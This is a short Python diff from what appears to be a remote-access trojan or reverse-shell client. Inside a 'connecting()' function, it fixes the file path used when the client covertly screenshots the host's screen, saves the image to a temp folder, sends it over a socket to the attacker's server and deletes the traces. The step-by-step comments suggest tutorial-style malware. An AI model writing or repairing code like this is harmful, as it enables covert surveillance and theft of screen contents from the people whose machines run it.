@@ -50,11 +50,13 @@ def connecting():
             # Create a temp dir to store our screenshot file
             # Sample dirpath: C:\Users\pulama\AppData\Local\Temp\tmp8dfj57ox
             dirpath = tempfile.mkdtemp()
+            filename = "img.jpg"
+            fullpath = os.path.join(dirpath, filename)
 
             #grab () method takes a snapshot of the screen
             #save () method saves the snapshot in the temp dir
-            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
-            transfer(s, dirpath + "\img. jpg") #transfer to the Server using our transfer function
+            ImageGrab.grab().save(fullpath, "JPEG")
+            transfer(s, fullpath) #transfer to the Server using our transfer function
             shutil.rmtree(dirpath) #delete the temp directory using shutil remove tree
 
         else:
